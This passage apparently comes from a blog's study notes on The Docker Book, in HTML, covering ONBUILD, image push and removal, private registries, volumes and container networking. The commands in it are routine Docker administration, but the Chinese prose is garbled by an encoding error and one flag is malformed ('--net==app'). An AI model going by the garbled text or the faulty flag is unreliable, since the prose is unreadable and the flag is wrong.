   </p><p>Docker é¢„å®šä¹‰äº†ä¸€ç»„ ARG å˜é‡:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTP<span class="hljs-emphasis">_PROXY</span><br><span class="hljs-emphasis">http_proxy</span><br><span class="hljs-emphasis">HTTPS_PROXY</span><br><span class="hljs-emphasis">https_proxy</span><br><span class="hljs-emphasis">ftp_proxy</span><br><span class="hljs-emphasis">FTP_PROXY</span><br><span class="hljs-emphasis">NO_PROXY</span><br><span class="hljs-emphasis">no_</span>proxy<br></code></pre></td></tr></table></figure><h4 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h4><p>ä¸ºé•œåƒæ·»åŠ è§¦å‘å™¨(trigger). å½“ä¸€ä¸ªé•œåƒè¢«ç”¨ä½œå…¶ä»–é•œåƒçš„åŸºç¡€é•œåƒæ—¶, è¯¥é•œåƒä¸­çš„è§¦å‘å™¨å°†ä¼šè¢«æ‰§è¡Œ.</p><p>è§¦å‘å™¨ä¼šåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ’å…¥æ–°æŒ‡ä»¤, æˆ‘ä»¬å¯ä»¥è®¤ä¸ºè¿™äº›æŒ‡ä»¤æ˜¯ç´§è·Ÿåœ¨ FROM ä¹‹åæŒ‡å®šçš„:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">ONBUILD</span> <span class="hljs-keyword">ADD</span><span class="language-bash"> . /app/arc</span><br><span class="hljs-keyword">ONBUILD</span> <span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /app/src &amp;&amp; make</span><br></code></pre></td></tr></table></figure><p><code>ONBUILD</code> æŒ‡ä»¤å¯ä»¥åœ¨é•œåƒä¸Šè¿è¡Œ <code>docker inspect</code> æŸ¥çœ‹.</p><p><code>ONBUILD</code> è§¦å‘å™¨ä¼šæŒ‰ç…§çˆ¶é•œåƒä¸­æŒ‡å®šçš„é¡ºåºæ‰§è¡Œ, å¹¶ä¸”åªèƒ½è¢«ç»§æ‰¿ä¸€æ¬¡.</p><p>æœ‰éƒ¨åˆ†æŒ‡ä»¤ä¸èƒ½ç”¨åœ¨ <code>ONBUILD</code> ä¸­, é˜²æ­¢é€’å½’è°ƒç”¨.</p><h2 id="4-6-å°†é•œåƒæ¨é€åˆ°-Docker-Hub"><a href="#4-6-å°†é•œåƒæ¨é€åˆ°-Docker-Hub" class="headerlink" title="4.6 å°†é•œåƒæ¨é€åˆ° Docker Hub"></a>4.6 å°†é•œåƒæ¨é€åˆ° Docker Hub</h2><p>ä½¿ç”¨ <code>docker push</code> å‘½ä»¤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker push jamtur01/static_web</span><br></code></pre></td></tr></table></figure><p>åº”è¯¥è¦å…ˆç™»å½•, ç”¨ <code>docker login</code></p><h3 id="è‡ªåŠ¨æ„å»º-Automated-Builds"><a href="#è‡ªåŠ¨æ„å»º-Automated-Builds" class="headerlink" title="è‡ªåŠ¨æ„å»º(Automated Builds)"></a>è‡ªåŠ¨æ„å»º(Automated Builds)</h3><p>å°† Github æˆ– BitBucket ä¸­å«æœ‰ Dockerfile æ–‡ä»¶çš„ä»“åº“è¿æ¥åˆ° Docker Hub å³å¯. å…·ä½“å‚è€ƒä¹¦ç±.</p><h2 id="4-7-åˆ é™¤é•œåƒ"><a href="#4-7-åˆ é™¤é•œåƒ" class="headerlink" title="4.7 åˆ é™¤é•œåƒ"></a>4.7 åˆ é™¤é•œåƒ</h2><p>ä½¿ç”¨ <code>docker rmi</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker rmi jamtur01/static_web</span><br></code></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ª <code>Deleted:</code> è¡Œéƒ½ä»£è¡¨ä¸€ä¸ªé•œåƒå±‚è¢«åˆ é™¤.</p><h2 id="4-8-è¿è¡Œè‡ªå·±çš„-Docker-Registry"><a href="#4-8-è¿è¡Œè‡ªå·±çš„-Docker-Registry" class="headerlink" title="4.8 è¿è¡Œè‡ªå·±çš„ Docker Registry"></a>4.8 è¿è¡Œè‡ªå·±çš„ Docker Registry</h2><p>Registry å°±ç›¸å½“äº repository.</p><h3 id="4-8-1-ä»å®¹å™¨è¿è¡Œ-Registry"><a href="#4-8-1-ä»å®¹å™¨è¿è¡Œ-Registry" class="headerlink" title="4.8.1 ä»å®¹å™¨è¿è¡Œ Registry"></a>4.8.1 ä»å®¹å™¨è¿è¡Œ Registry</h3><p>ä»å®¹å™¨å®‰è£…ä¸€ä¸ª Registry:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> -p 5000:5000 registry:2<br></code></pre></td></tr></table></figure><p>å¯åŠ¨ä¸€ä¸ªè¿è¡Œ Registry åº”ç”¨ 2.0 ç‰ˆæœ¬çš„å®¹å™¨.</p><h3 id="4-8-2-æµ‹è¯•æ–°-Registry"><a href="#4-8-2-æµ‹è¯•æ–°-Registry" class="headerlink" title="4.8.2 æµ‹è¯•æ–° Registry"></a>4.8.2 æµ‹è¯•æ–° Registry</h3><p>å…ˆé€šè¿‡ <code>docker images</code> æ‰¾åˆ°é•œåƒ ID:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker images jamtur01/static_web</span><br></code></pre></td></tr></table></figure><p>ç„¶åç”¨ Registry ç»™é•œåƒæ‰“ä¸Šæ ‡ç­¾:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ sudo docker <span class="hljs-keyword">tag</span> <span class="hljs-title">22d47c8cb6e5</span><br></code></pre></td></tr></table></figure><p>æœ€åé€šè¿‡ <code>docker push</code> å°†å…¶æ¨é€åˆ° Registry ä¸­, ä¸ºäº†æŒ‡å®šæ–°çš„ Registry çš„åœ°å€, éœ€è¦åœ¨é•œåƒåå‰åŠ ä¸Šä¸»æœºåå’Œç«¯å£å‰ç¼€:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo docker <span class="hljs-keyword">push</span> docker.example.com:<span class="hljs-number">5000</span><span class="hljs-regexp">/jamtur01/</span>static_web<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å…¶æ„å»ºæ–°å®¹å™¨:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -t -i docker.example.com:5000/jamtur01/static_web</span><br></code></pre></td></tr></table></figure><h2 id="4-9-å…¶ä»–å¯é€‰çš„-Registry-æœåŠ¡"><a href="#4-9-å…¶ä»–å¯é€‰çš„-Registry-æœåŠ¡" class="headerlink" title="4.9 å…¶ä»–å¯é€‰çš„ Registry æœåŠ¡"></a>4.9 å…¶ä»–å¯é€‰çš„ Registry æœåŠ¡</h2><h1 id="ç¬¬5ç« -åœ¨æµ‹è¯•ä¸­ä½¿ç”¨-Docker"><a href="#ç¬¬5ç« -åœ¨æµ‹è¯•ä¸­ä½¿ç”¨-Docker" class="headerlink" title="ç¬¬5ç«  åœ¨æµ‹è¯•ä¸­ä½¿ç”¨ Docker"></a>ç¬¬5ç«  åœ¨æµ‹è¯•ä¸­ä½¿ç”¨ Docker</h1><h2 id="5-1-ä½¿ç”¨-Docker-æµ‹è¯•é™æ€ç½‘ç«™"><a href="#5-1-ä½¿ç”¨-Docker-æµ‹è¯•é™æ€ç½‘ç«™" class="headerlink" title="5.1 ä½¿ç”¨ Docker æµ‹è¯•é™æ€ç½‘ç«™"></a>5.1 ä½¿ç”¨ Docker æµ‹è¯•é™æ€ç½‘ç«™</h2><p>å°† Docker ä½œä¸ºæœ¬åœ° Web å¼€å‘ç¯å¢ƒæ˜¯ Docker çš„ä¸€ä¸ªæœ€ç®€å•çš„åº”ç”¨åœºæ™¯ã€‚</p><p>è¦æƒ³ä¿æŒ Docker å®¹å™¨çš„æ´»è·ƒçŠ¶æ€ï¼Œéœ€è¦å…¶ä¸­è¿è¡Œçš„è¿›ç¨‹ä¸èƒ½ä¸­æ–­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒNginx ä¼šä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨ï¼Œè¿™ä¼šå¯¼è‡´å®¹å™¨åªæ˜¯çŸ­æš‚è¿è¡Œï¼Œåœ¨å®ˆæŠ¤è¿›ç¨‹è¢« fork åï¼Œå‘èµ·å®ˆæŠ¤è¿›ç¨‹çš„åŸå§‹è¿›ç¨‹å°±ä¼šé€€å‡ºï¼Œè¿™æ—¶å®¹å™¨å°±åœæ­¢è¿è¡Œäº†.</p><h3 id="5-1-2-æ„å»º-Sample-ç½‘ç«™å’Œ-Nginx-é•œåƒ"><a href="#5-1-2-æ„å»º-Sample-ç½‘ç«™å’Œ-Nginx-é•œåƒ" class="headerlink" title="5.1.2 æ„å»º Sample ç½‘ç«™å’Œ Nginx é•œåƒ"></a>5.1.2 æ„å»º Sample ç½‘ç«™å’Œ Nginx é•œåƒ</h3><h3 id="5-1-3-ä»-Sample-ç½‘ç«™å’Œ-Nginx-é•œåƒæ„å»ºå®¹å™¨"><a href="#5-1-3-ä»-Sample-ç½‘ç«™å’Œ-Nginx-é•œåƒæ„å»ºå®¹å™¨" class="headerlink" title="5.1.3 ä» Sample ç½‘ç«™å’Œ Nginx é•œåƒæ„å»ºå®¹å™¨"></a>5.1.3 ä» Sample ç½‘ç«™å’Œ Nginx é•œåƒæ„å»ºå®¹å™¨</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -d -p <span class="hljs-number">80</span> --name website -v <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/website:/</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/website jamtur01/</span>nginx nginx<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>-v</code> é€‰é¡¹å…è®¸æˆ‘ä»¬å°†å®¿ä¸»æœºçš„ç›®å½•ä½œä¸ºå·ï¼ŒæŒ‚è½½åˆ°å®¹å™¨é‡Œã€‚</p><p>ä¸¤ä¸ªç›®å½•ç”¨ <code>:</code> åˆ†éš”ï¼Œå‰è€…ä¸ºå®¿ä¸»æœºç›®å½•ï¼Œåè€…ä¸ºå®¹å™¨ç›®å½•ï¼Œå¦‚æœå®¹å™¨ç›®å½•ä¸å­˜åœ¨ï¼ŒDocker ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªã€‚</p><p>å¯ä»¥é€šè¿‡åœ¨ç›®å½•åé¢åŠ ä¸Š <code>rw</code> æˆ– <code>ro</code> æ¥æŒ‡å®šå®¹å™¨å†…ç›®å½•çš„è¯»å†™çŠ¶æ€:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -d -p <span class="hljs-number">80</span> --name website -v <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/website:/</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/website:ro jamtur01/</span>nginx nginx<br></code></pre></td></tr></table></figure><h4 id="å·çš„æ¦‚å¿µ"><a href="#å·çš„æ¦‚å¿µ" class="headerlink" title="å·çš„æ¦‚å¿µ"></a>å·çš„æ¦‚å¿µ</h4><p>å·æ˜¯åœ¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨å†…è¢«é€‰å®šçš„ç›®å½•ï¼Œå¯ä»¥ç»•è¿‡åˆ†å±‚çš„è”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œä¸º Docker æä¾›æŒä¹…æ•°æ®æˆ–è€…å…±äº«æ•°æ®ã€‚</p><p>å¯¹å·çš„ä¿®æ”¹ä¼šç«‹å³ç”Ÿæ•ˆï¼Œå¹¶ç»•è¿‡é•œåƒï¼Œå½“æäº¤æˆ–è€…åˆ›å»ºé•œåƒæ—¶ï¼Œå·ä¸è¢«åŒ…å«åœ¨é•œåƒé‡Œã€‚</p><p>å·æ˜¯ä»å®¿ä¸»æœºè€Œæ¥ã€‚</p><h3 id="5-1-4-ä¿®æ”¹ç½‘ç«™"><a href="#5-1-4-ä¿®æ”¹ç½‘ç«™" class="headerlink" title="5.1.4 ä¿®æ”¹ç½‘ç«™"></a>5.1.4 ä¿®æ”¹ç½‘ç«™</h3><p>ç›´æ¥ä¿®æ”¹æœ¬åœ°å®¿ä¸»æœºçš„ website ç›®å½•ä¸‹çš„ index.html æ–‡ä»¶, ä¹Ÿå°±æ˜¯å·å†…çš„æ–‡ä»¶:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ vim <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/website/i</span>ndex.html<br></code></pre></td></tr></table></figure><h2 id="5-2-ä½¿ç”¨-Docker-æ„å»ºå¹¶æµ‹è¯•-Web-åº”ç”¨ç¨‹åº"><a href="#5-2-ä½¿ç”¨-Docker-æ„å»ºå¹¶æµ‹è¯•-Web-åº”ç”¨ç¨‹åº" class="headerlink" title="5.2 ä½¿ç”¨ Docker æ„å»ºå¹¶æµ‹è¯• Web åº”ç”¨ç¨‹åº"></a>5.2 ä½¿ç”¨ Docker æ„å»ºå¹¶æµ‹è¯• Web åº”ç”¨ç¨‹åº</h2><p>Sinatra æ˜¯ä¸€ä¸ªåŸºäº Ruby çš„ Web åº”ç”¨æ¡†æ¶ï¼Œå®ƒåŒ…å«ä¸€ä¸ª Web åº”ç”¨åº“ï¼Œä»¥åŠç®€å•çš„é¢†åŸŸä¸“ç”¨è¯­è¨€ (DSL) æ¥æ„å»º Web åº”ç”¨ã€‚</p><p>Sinatra éå¸¸é€‚åˆç”¨æ¥åˆ›å»ºä¸€ä¸ªå°å‹çš„ç¤ºä¾‹åº”ç”¨è¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="5-2-1-æ„å»º-Sinatra-åº”ç”¨ç¨‹åº"><a href="#5-2-1-æ„å»º-Sinatra-åº”ç”¨ç¨‹åº" class="headerlink" title="5.2.1 æ„å»º Sinatra åº”ç”¨ç¨‹åº"></a>5.2.1 æ„å»º Sinatra åº”ç”¨ç¨‹åº</h3><h3 id="5-2-4-å°†-Sinatra-åº”ç”¨ç¨‹åºè¿æ¥åˆ°-Redis-å®¹å™¨"><a href="#5-2-4-å°†-Sinatra-åº”ç”¨ç¨‹åºè¿æ¥åˆ°-Redis-å®¹å™¨" class="headerlink" title="5.2.4 å°† Sinatra åº”ç”¨ç¨‹åºè¿æ¥åˆ° Redis å®¹å™¨"></a>5.2.4 å°† Sinatra åº”ç”¨ç¨‹åºè¿æ¥åˆ° Redis å®¹å™¨</h3><p>ä¸¤ç§æ¯”è¾ƒç°å®çš„è¿æ¥ Docker å®¹å™¨çš„æ–¹æ³•æ˜¯:</p><ul><li>Docker Networking, Docker 1.9 åŠæ›´æ–°ç‰ˆæœ¬æ¨èä½¿ç”¨</li><li>Docker link, Docker 1.9 ä¹‹å‰ç‰ˆæœ¬æ¨èä½¿ç”¨</li></ul><p>Docker Networking å’Œ Docker link çš„åŒºåˆ«:</p><ul><li>Docker Networking å¯ä»¥å°†å®¹å™¨è¿æ¥åˆ°ä¸åŒå®¿ä¸»æœºä¸Šçš„å®¹å™¨</li><li>é€šè¿‡ Docker Networking è¿æ¥çš„å®¹å™¨å¯ä»¥åœ¨æ— éœ€æ›´æ–°è¿æ¥çš„æƒ…å†µä¸‹ï¼Œå¯¹åœæ­¢ã€å¯åŠ¨æˆ–è€…é‡å¯å®¹å™¨ã€‚</li><li>ä½¿ç”¨ Docker Networking, ä¸å¿…äº‹å…ˆåˆ›å»ºå®¹å™¨å†å»è¿æ¥å®ƒã€‚åŒæ ·ä¸å¿…å…³å¿ƒå®¹å™¨çš„è¿è¡Œé¡ºåºã€‚</li></ul><h3 id="5-2-5-Docker-å†…éƒ¨è¿ç½‘"><a href="#5-2-5-Docker-å†…éƒ¨è¿ç½‘" class="headerlink" title="5.2.5 Docker å†…éƒ¨è¿ç½‘"></a>5.2.5 Docker å†…éƒ¨è¿ç½‘</h3><p>åœ¨å®‰è£… Docker æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘ç»œæ¥å£ï¼Œåå­—æ˜¯ docker0.</p><p>æ¯ä¸ª Docker å®¹å™¨éƒ½ä¼šåœ¨è¿™ä¸ªæ¥å£ä¸Šåˆ†é…ä¸€ä¸ª IP åœ°å€ã€‚</p><p>å¯åŠ¨ IPv6, åœ¨è¿è¡Œ Docker å®ˆæŠ¤è¿›ç¨‹æ—¶åŠ ä¸Š <code>--ipv6</code> æ ‡å¿—.</p><p>æ¥å£æœ¬èº«çš„åœ°å€æ˜¯è¿™ä¸ª Docker ç½‘ç»œçš„ç½‘å…³åœ°å€ï¼Œä¹Ÿæ˜¯æ‰€æœ‰ Docker å®¹å™¨çš„ç½‘å…³åœ°å€ã€‚</p><p>Docker ä¼šé»˜è®¤ä½¿ç”¨ 172.17.x.x ä½œä¸ºå­ç½‘åœ°å€ï¼Œé™¤éè¢«å ç”¨ï¼ŒDocker å°±ä¼šåœ¨ 172.16~172.30 è¿™ä¸ªèŒƒå›´å†…å°è¯•åˆ›å»ºå­ç½‘.</p><p>Docker æ¯åˆ›å»ºä¸€ä¸ªå®¹å™¨å°±ä¼šåˆ›å»ºä¸€ç»„äº’è”çš„ç½‘ç»œæ¥å£ï¼Œå…¶ä¸­ä¸€ç«¯ä½œä¸ºå®¹å™¨é‡Œçš„ eth0 æ¥å£ï¼Œè€Œå¦ä¸€ç«¯ç»Ÿä¸€å‘½åä¸º vethec6a è¿™ç§åå­—ï¼Œä½œä¸ºå®¿ä¸»æœºçš„ä¸€ä¸ªç«¯å£.</p><p>é€šè¿‡æŠŠæ¯ä¸ª veth* æ¥å£ç»‘å®šåˆ° docker0 ç½‘æ¡¥ï¼ŒDocker åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿå­ç½‘ï¼Œè¿™ä¸ªå­ç½‘ç”±å®¿ä¸»æœºå’Œæ‰€æœ‰çš„ Docker å®¹å™¨å…±äº«ã€‚</p><p>ä»å®¹å™¨å†…è·Ÿè¸ªè·¯ç”±:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"># apt-<span class="hljs-built_in">get</span> -yqq <span class="hljs-keyword">update</span> &amp;&amp; apt-<span class="hljs-built_in">get</span> install -yqq traceroute<br># traceroute google.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å®¿ä¸»æœºçš„ IPTables NAT é…ç½®:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">$ sudo iptables -<span class="hljs-built_in">t</span> nat -L -<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>Docker é»˜è®¤ä¼šæŠŠå…¬å¼€çš„ç«¯å£ç»‘å®šåˆ°æ‰€æœ‰çš„ç½‘ç»œæ¥å£ä¸Šã€‚</p><p>å¦‚æœé‡å¯å®¹å™¨ï¼ŒDocker ä¼šæ”¹å˜å®¹å™¨çš„ IP åœ°å€.</p><h3 id="5-2-6-Docker-Networking"><a href="#5-2-6-Docker-Networking" class="headerlink" title="5.2.6 Docker Networking"></a>5.2.6 Docker Networking</h3><p>å®¹å™¨ä¹‹é—´çš„è¿æ¥ç”¨ç½‘ç»œåˆ›å»ºï¼Œè¢«ç§°ä¸º Docker Networking.</p><p>Docker Networking å…è®¸ç”¨æˆ·åˆ›å»ºè‡ªå·±çš„ç½‘ç»œï¼Œå®¹å™¨å¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ä¸Šäº’ç›¸é€šä¿¡.</p><p>ä½¿ç”¨ Docker Networking éœ€å…ˆåˆ›å»ºä¸€ä¸ªç½‘ç»œï¼Œç„¶ååœ¨è¿™ä¸ªç½‘ç»œä¸‹å¯åŠ¨å®¹å™¨:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker network create app<br></code></pre></td></tr></table></figure><p><code>create</code> åæ¥åç§°.</p><p>æŸ¥çœ‹æ–°åˆ›å»ºçš„ç½‘ç»œ:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ sudo docker network <span class="hljs-keyword">inspect</span> <span class="hljs-keyword">app</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.docker.com/engine/userguide/networking/get-started-overlay/">Docker å¤šå®¿ä¸»æœºç½‘ç»œæ–‡æ¡£</a></p><p>åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç½‘ç»œ:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> docker network <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>åˆ é™¤ä¸€ä¸ª Docker ç½‘ç»œ:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> docker network <span class="hljs-built_in">rm</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ å®¹å™¨:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> -d <span class="hljs-attribute">--net</span>==app --name db jamtur01/redis<br></code></pre></td></tr></table></figure><p><code>--net</code> æ ‡å¿—æŒ‡å®šäº†æ–°å®¹å™¨å°†ä¼šåœ¨å“ªä¸ªç½‘ç»œä¸­è¿è¡Œã€‚</p><p>Docker ä¼šæ„ŸçŸ¥æ‰€æœ‰åœ¨è¿™ä¸ªç½‘ç»œä¸‹è¿è¡Œçš„å®¹å™¨ï¼Œå¹¶ä¸”é€šè¿‡ <code>/etc/hosts</code> æ–‡ä»¶å°†è¿™äº›å®¹å™¨çš„åœ°å€ä¿å­˜åˆ°æœ¬åœ° DNS ä¸­ã€‚</p><p><code>app</code> ç½‘ç»œå†…éƒ¨çš„ä»»ä½•ä¸»æœºéƒ½å¯ä»¥ä½¿ç”¨ <code>hostname.app</code> å½¢å¼æ¥è¢«è§£æã€‚</p><p>åœ¨å®¿ä¸»æœºä¸‹å¦‚:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ ping <span class="hljs-keyword">db</span>.<span class="hljs-keyword">app</span><br></code></pre></td></tr></table></figure><h4 id="å°†å·²æœ‰å®¹å™¨è¿æ¥åˆ°-Docker-ç½‘ç»œ"><a href="#å°†å·²æœ‰å®¹å™¨è¿æ¥åˆ°-Docker-ç½‘ç»œ" class="headerlink" title="å°†å·²æœ‰å®¹å™¨è¿æ¥åˆ° Docker ç½‘ç»œ"></a>å°†å·²æœ‰å®¹å™¨è¿æ¥åˆ° Docker ç½‘ç»œ</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker network connect app db2<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>app</code> ä¸ºç½‘ç»œåç§°ï¼Œ<code>db2</code> ä¸ºå®¹å™¨åç§°.</p><h4 id="æ–­å¼€ä¸€ä¸ªå®¹å™¨ä¸æŒ‡å®šç½‘ç»œçš„é“¾æ¥"><a href="#æ–­å¼€ä¸€ä¸ªå®¹å™¨ä¸æŒ‡å®šç½‘ç»œçš„é“¾æ¥" class="headerlink" title="æ–­å¼€ä¸€ä¸ªå®¹å™¨ä¸æŒ‡å®šç½‘ç»œçš„é“¾æ¥"></a>æ–­å¼€ä¸€ä¸ªå®¹å™¨ä¸æŒ‡å®šç½‘ç»œçš„é“¾æ¥</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo docker network disconnect app db2<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå®¹å™¨å¯ä»¥åŒæ—¶éš¶å±å¤šä¸ª Docker Networking.</p><h4 id="é€šè¿‡-Docker-link-è¿æ¥å®¹å™¨"><a href="#é€šè¿‡-Docker-link-è¿æ¥å®¹å™¨" class="headerlink" title="é€šè¿‡ Docker link è¿æ¥å®¹å™¨"></a>é€šè¿‡ Docker link è¿æ¥å®¹å™¨</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -p <span class="hljs-number">4567</span> --name webapp --link redis:db -t -i -v <span class="hljs-variable">$PWD</span><span class="hljs-regexp">/webapp_redis:/</span>opt<span class="hljs-regexp">/webapp jamtur01/</span>sinatra <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p><code>--link</code> æ ‡å¿—ï¼Œç”¨äºåˆ›å»ºä¸¤ä¸ªå®¹å™¨é—´çš„å®¢æˆ·-æœåŠ¡é“¾æ¥ã€‚å…¶éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…æ˜¯è¦é“¾æ¥çš„å®¹å™¨çš„åç§°ï¼Œåä¸€ä¸ªæ˜¯è¿™ä¸ªé“¾æ¥çš„åˆ«åã€‚è¿™é‡Œ <code>webapp</code> æ˜¯å®¢æˆ·ï¼Œ<code>redis</code> æ˜¯â€æœåŠ¡â€.</p><p>é€šè¿‡æŠŠå®¹å™¨é“¾æ¥åœ¨ä¸€èµ·ï¼Œå¯ä»¥è®©å®¢æˆ·å®¹å™¨ç›´æ¥è®¿é—®ä»»æ„æœåŠ¡å®¹å™¨çš„å…¬å¼€ç«¯å£.</p><p>åªæœ‰ä½¿ç”¨ <code>--link</code> æ ‡å¿—é“¾æ¥åˆ°è¿™ä¸ªå®¹å™¨çš„å®¹å™¨æ‰èƒ½è¿æ¥åˆ°è¿™ä¸ªç«¯å£ã€‚</p><p>å¯ä»¥æŠŠå¤šä¸ªå®¹å™¨é“¾æ¥åœ¨ä¸€èµ·:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ sudo docker run -p 4567 <span class="hljs-params">--name</span> webapp2 <span class="hljs-params">--link</span> redis<span class="hljs-function">:db</span> <span class="hljs-string">...</span><br>$ sudo docker run -p 4567 <span class="hljs-params">--name</span> webapp3 <span class="hljs-params">--link</span> redis<span class="hljs-function">:db</span> <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿è¡Œå®¹å™¨æ—¶æŒ‡å®š <code>--add-host</code> é€‰é¡¹ï¼Œå¯ä»¥åœ¨ <code>/etc/hosts</code> æ–‡ä»¶ä¸­æ·»åŠ ç›¸åº”çš„è®°å½•:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker <span class="hljs-built_in">run</span> -p 4567 <span class="hljs-attribute">--add-host</span>=docker:10.0.0.1 <span class="hljs-built_in">..</span>.<br></code></pre></td></tr></table></figure><p>åœ¨å®¹å™¨ä¸­å¯ä»¥ç”¨ <code>env</code> å‘½ä»¤æŸ¥çœ‹æ–°åˆ›å»ºçš„ç¯å¢ƒå˜é‡çš„ä¿¡æ¯.</p><h3 id="5-2-7-ä½¿ç”¨å®¹å™¨è¿æ¥æ¥é€šä¿¡"><a href="#5-2-7-ä½¿ç”¨å®¹å™¨è¿æ¥æ¥é€šä¿¡" class="headerlink" title="5.2.7 ä½¿ç”¨å®¹å™¨è¿æ¥æ¥é€šä¿¡"></a>5.2.7 ä½¿ç”¨å®¹å™¨è¿æ¥æ¥é€šä¿¡</h3><h2 id="5-3-Docker-ç”¨äºæŒç»­é›†æˆ"><a href="#5-3-Docker-ç”¨äºæŒç»­é›†æˆ" class="headerlink" title="5.3 Docker ç”¨äºæŒç»­é›†æˆ"></a>5.3 Docker ç”¨äºæŒç»­é›†æˆ</h2><p>å³åœ¨å¤šå¼€å‘è€…çš„æŒç»­é›†æˆæµ‹è¯•åœºæ™¯ä¸­ä½¿ç”¨ Docker.</p><h1 id="ç¬¬6ç« -ä½¿ç”¨-Docker-æ„å»ºæœåŠ¡"><a href="#ç¬¬6ç« -ä½¿ç”¨-Docker-æ„å»ºæœåŠ¡" class="headerlink" title="ç¬¬6ç«  